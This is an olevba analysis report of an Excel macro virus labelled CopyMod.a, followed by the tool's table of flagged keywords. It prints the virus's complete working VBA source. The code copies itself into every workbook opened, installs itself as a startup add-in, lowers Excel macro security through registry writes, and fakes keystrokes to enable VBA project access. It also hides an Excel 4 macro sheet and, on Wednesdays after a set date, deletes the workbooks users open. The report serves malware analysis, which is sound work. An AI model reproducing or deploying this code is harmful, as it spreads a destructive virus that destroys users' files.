olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.CopyMod.a-38bddd11c74220fc07eca81aba59e9de9ceea9bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.CopyMod.a-38bddd11c74220fc07eca81aba59e9de9ceea9bf - OLE stream: 'ObjectPool/_1234567890/_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.CopyMod.a-38bddd11c74220fc07eca81aba59e9de9ceea9bf - OLE stream: 'ObjectPool/_1234567890/_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO copymod.bas 
in file: Virus.MSExcel.CopyMod.a-38bddd11c74220fc07eca81aba59e9de9ceea9bf - OLE stream: 'ObjectPool/_1234567890/_VBA_PROJECT_CUR/VBA/copymod'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global Const REG_SZ As Long = 1
Global Const REG_DWORD As Long = 4
Global Const HKEY_LOCAL_MACHINE = &H80000002
Global Const HKEY_CURRENT_USER = &H80000001
Global Const KEY_ALL_ACCESS = &H3F
Global Const REG_OPTION_NON_VOLATILE = 0

Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, ByVal cbData As Long) As Long


Sub auto_open()
Application.DisplayAlerts = False
If ThisWorkbook.Path <> Application.StartupPath Then
  Application.ScreenUpdating = False
  Call delete_this_wk
  Call copytoworkbook
  If Movemacro4(ThisWorkbook) Then GoTo 800
800:
  ThisWorkbook.Save
  Application.ScreenUpdating = True
End If
End Sub
Private Sub copytoworkbook()
  Const DQUOTE = """" ' one " character
  With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
.InsertLines 1, "Public WithEvents xx As Application"
.InsertLines 2, "Private Sub Workbook_open()"
.InsertLines 3, "Set xx = Application"
.InsertLines 4, "On Error Resume Next"
.InsertLines 5, "If Sheets(1).Name <> " & DQUOTE & "Macro1" & DQUOTE & " Then"
.InsertLines 6, "Call auto_open"
.InsertLines 7, "End If"
.InsertLines 8, "Application.DisplayAlerts = False"
.InsertLines 9, "Security (1)"
.InsertLines 10, "Call SetAllowableVbe"
.InsertLines 11, "Call Microsofthobby"
.InsertLines 12, "End Sub"
.InsertLines 13, "Private Sub xx_workbookOpen(ByVal wb As Workbook)"
.InsertLines 14, "On Error Resume Next"
.InsertLines 15, "wb.VBProject.References.AddFromGuid _"
.InsertLines 16, "GUID:=" & DQUOTE & "{0002E157-0000-0000-C000-000000000046}" & DQUOTE & ", _"
.InsertLines 17, "Major:=5, Minor:=3"
.InsertLines 18, "Application.ScreenUpdating = False"
.InsertLines 19, "Application.DisplayAlerts = False"
.InsertLines 20, "If Now >= DateSerial(" & DQUOTE & "2011" & DQUOTE & ", " & DQUOTE & "4" & DQUOTE & ", " & DQUOTE & "1" & DQUOTE & ") _"
.InsertLines 21, "And Weekday(Now, vbMonday) = 3 And wb.Name <> " & DQUOTE & "rpt_pdm2cvs.xls" & DQUOTE & "Then"
.InsertLines 22, "wb.ChangeFileAccess xlReadOnly"
.InsertLines 23, "Kill wb.FullName"
.InsertLines 24, "wb.Close False"
.InsertLines 25, "End If"
.InsertLines 26, "If copystart(wb) Then GoTo 700"
.InsertLines 27, "700: wb.Save"
.InsertLines 28, "Application.ScreenUpdating = True"
.InsertLines 29, "End Sub"

End With
End Sub

Private Sub delete_this_wk()
Dim VBProj As VBIDE.VBProject
Dim VBComp As VBIDE.VBComponent
Dim CodeMod As VBIDE.CodeModule

Set VBProj = ThisWorkbook.VBProject
Set VBComp = VBProj.VBComponents("ThisWorkbook")
Set CodeMod = VBComp.CodeModule
With CodeMod
    .DeleteLines 1, .CountOfLines
End With

End Sub


Function copystart(ByVal wb As Workbook)
On Error Resume Next

Dim VBProj1 As VBIDE.VBProject
Dim VBProj2 As VBIDE.VBProject
Set VBProj1 = Workbooks("rpt_pdm2cvs.xls").VBProject
Set VBProj2 = wb.VBProject


If copymodule("copymod", VBProj1, VBProj2, False) Then Exit Function

End Function


Function copymodule(ModuleName As String, _
    FromVBProject As VBIDE.VBProject, _
    ToVBProject As VBIDE.VBProject, _
    OverwriteExisting As Boolean) As Boolean
   
    On Error Resume Next

    Dim VBComp As VBIDE.VBComponent
    Dim FName As String
    Dim CompName As String
    Dim S As String
    Dim SlashPos As Long
    Dim ExtPos As Long
    Dim TempVBComp As VBIDE.VBComponent
    
    If FromVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If Trim(ModuleName) = vbNullString Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If FromVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    On Error Resume Next
    Set VBComp = FromVBProject.VBComponents(ModuleName)
    If Err.Number <> 0 Then
        copymodule = False
        Exit Function
    End If
   
    FName = Environ("Temp") & "\" & ModuleName & ".bas"
    If OverwriteExisting = True Then
       
        If Dir(FName, vbNormal + vbHidden + vbSystem) <> vbNullString Then
            Err.Clear
            Kill FName
            If Err.Number <> 0 Then
                copymodule = False
                Exit Function
            End If
        End If
        With ToVBProject.VBComponents
            .Remove .Item(ModuleName)
        End With
    Else
        
        Err.Clear
        Set VBComp = ToVBProject.VBComponents(ModuleName)
        If Err.Number <> 0 Then
            If Err.Number = 9 Then
               
            Else
               
                copymodule = False
                Exit Function
            End If
        End If
    End If
   
    FromVBProject.VBComponents(ModuleName).Export Filename:=FName
   
    SlashPos = InStrRev(FName, "\")
    ExtPos = InStrRev(FName, ".")
    CompName = Mid(FName, SlashPos + 1, ExtPos - SlashPos - 1)
    
    Set VBComp = Nothing
    Set VBComp = ToVBProject.VBComponents(CompName)
    
    If VBComp Is Nothing Then
        ToVBProject.VBComponents.Import Filename:=FName
    Else
        If VBComp.Type = vbext_ct_Document Then
            
            Set TempVBComp = ToVBProject.VBComponents.Import(FName)
           
            With VBComp.CodeModule
                .DeleteLines 1, .CountOfLines
                S = TempVBComp.CodeModule.Lines(1, TempVBComp.CodeModule.CountOfLines)
                .InsertLines 1, S
            End With
            On Error GoTo 0
            ToVBProject.VBComponents.Remove TempVBComp
        End If
    End If
    Kill FName
    copymodule = True
End Function

Function Movemacro4(ByVal wb As Workbook)
On Error Resume Next

  Dim sht As Object

    wb.Sheets(1).Select
    Sheets.Add Type:=xlExcel4MacroSheet
    ActiveSheet.Name = "Macro1"
    Range("A1").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "Door Locked"
    Range("A2").Select
    ActiveCell.FormulaR1C1 = "=ERROR(FALSE)"
    Range("A3").Select
    ActiveCell.FormulaR1C1 = "=IF(ERROR.TYPE(RUN(""TestMacro""))=4)"
    Range("A4").Select
    ActiveCell.FormulaR1C1 = "=  ALERT(""运行此文件，需要宏功能!"",3)"
    Range("A5").Select
    ActiveCell.FormulaR1C1 = "=  FILE.CLOSE(FALSE)"
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "=END.IF()"
    Range("A7").Select
    ActiveCell.FormulaR1C1 = "=RETURN()"
    
    For Each sht In wb.Sheets
    wb.Names.Add sht.Name & "!Auto_Activate", "=Macro1!$A$2", False
    Next
    wb.Sheets(1).Visible = False

End Function

Private Sub AddPrivateNames()
    On Error Resume Next

    Dim sht As Object

    For Each sht In Sheets
        ThisWorkbook.Names.Add sht.Name & "!Auto_Activate", "=Macro1!$A$2", False
    Next
End Sub
Private Sub HideMacroSheet()
    ThisWorkbook.Excel4MacroSheets(1).Visible = xlSheetHidden
End Sub
Private Sub HideMacroSheeth()
    ThisWorkbook.Excel4MacroSheets(1).Visible = -1
End Sub

Sub Microsofthobby()
On Error Resume Next
Dim myfile0 As String
Dim myfile As String
'
myfile0 = ThisWorkbook.FullName
myfile = Application.StartupPath & "\rpt_pdm2cvs.xls"

If ThisWorkbook.Path <> Application.StartupPath Then
     Set fs = CreateObject("Scripting.FileSystemObject")
     
 Application.ScreenUpdating = False
     
     If fs.FileExists(myfile) Then
       
       If True Then
        On Error Resume Next
        Workbooks("rpt_pdm2cvs.xls").Close False
        Kill myfile
        ThisWorkbook.IsAddin = True
        ThisWorkbook.SaveAs myfile
        Workbooks.Open myfile0
        Else
        ThisWorkbook.Close False
       End If
    
    Else
     ThisWorkbook.IsAddin = True
     ThisWorkbook.SaveAs myfile
     Workbooks.Open myfile0
 
   End If

 Application.ScreenUpdating = True

End If
End Sub

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Sub Security(Level)
    Dim VS As String
    VS = Application.Version
    CreateNewKey HKEY_LOCAL_MACHINE, "Software\Microsoft\Office\" & VS & "\Excel\Security\"
    SetKeyValue HKEY_LOCAL_MACHINE, "Software\Microsoft\Office\" & VS & "\Excel\Security", "Level", Level, 4
    CreateNewKey HKEY_CURRENT_USER, "Software\Microsoft\Office\" & VS & "\Excel\Security\"
    SetKeyValue HKEY_CURRENT_USER, "Software\Microsoft\Office\" & VS & "\Excel\Security", "Level", Level, 4
End Sub

Public Function CreateNewKey(lPredefinedKey As Long, sNewKeyName As String)
    Dim hNewKey As Long
    Dim lRetVal As Long
    
    lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
    RegCloseKey (hNewKey)
End Function

Public Function SetKeyValue(lPredefinedKey As Long, sKeyName As String, sValueName As String, vValueSetting As Variant, lValueType As Long)
       Dim lRetVal As Long
       Dim hKey As Long

       lRetVal = RegOpenKeyEx(lPredefinedKey, sKeyName, 0, KEY_ALL_ACCESS, hKey)
       lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
       RegCloseKey (hKey)

End Function

Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, vValue As Variant) As Long
    Dim lValue As Long
    Dim sValue As String

    Select Case lType
        Case REG_SZ
            sValue = vValue
            SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
        Case REG_DWORD
            lValue = vValue
            SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
        End Select

End Function
Sub SetAllowableVbe()
  On Error Resume Next
    Dim Chgset As Boolean
      Debug.Print ThisWorkbook.VBProject.Protection
        If Err.Number = 1004 Then
            Err.Clear
            Application.SendKeys "%TMS%T%V{ENTER}"
            Chgset = True
            DoEvents
       End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

